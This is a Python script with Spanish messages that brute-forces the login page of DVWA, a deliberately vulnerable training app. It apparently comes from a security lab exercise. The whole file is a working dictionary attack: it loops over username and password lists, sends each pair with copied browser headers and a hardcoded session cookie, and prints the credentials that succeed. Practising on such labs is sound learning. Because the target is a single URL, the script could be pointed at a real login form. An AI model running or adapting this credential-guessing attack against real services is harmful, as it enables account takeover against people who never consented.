import requests
import time

def leer_lista_desde_archivo(nombre_archivo):
    with open(nombre_archivo, 'r') as archivo:
        return [linea.strip() for linea in archivo.readlines()]

start_time = time.time()

url_base = "http://dvwa/vulnerabilities/brute/"

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'es-US,es-419;q=0.9,es;q=0.8',
    'Connection': 'keep-alive',
    'Cookie': 'PHPSESSID=7hm6ptm413mrlhp7e4b5lbapq5; security=low',
    'DNT': '1',
    'Host': 'dvwa',
    'Referer': 'http://dvwa/vulnerabilities/brute/',
    'Sec-Ch-Ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"macOS"',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/128.0.0.0 Safari/537.36'
}

users = leer_lista_desde_archivo('users.txt')
passwords = leer_lista_desde_archivo('passwords.txt')

total_intentos = 0
intentos_exitosos = 0

for user in users:
    for password in passwords:
        total_intentos += 1
        
        params = {
            'username': user,
            'password': password,
            'Login': 'Login'
        }
        
        try:
            response = requests.get(url_base, headers=headers, params=params)
            
            if 'Welcome to the password protected area' in response.text:
                print(f"[+] Login exitoso! Usuario: {user} | Contraseña: {password}")
                intentos_exitosos += 1
        except requests.exceptions.ConnectionError:
            print(f"[-] No se pudo conectar con el servidor en {url_base}. Verifica que el servidor esté en funcionamiento.")

end_time = time.time()

print(f"Total de intentos realizados: {total_intentos}")
print(f"Total de intentos exitosos: {intentos_exitosos}")
print(f"Tiempo de ejecución: {end_time - start_time} segundos")
print(f"Tiempo promedio por intento: {(end_time - start_time) / total_intentos} segundos")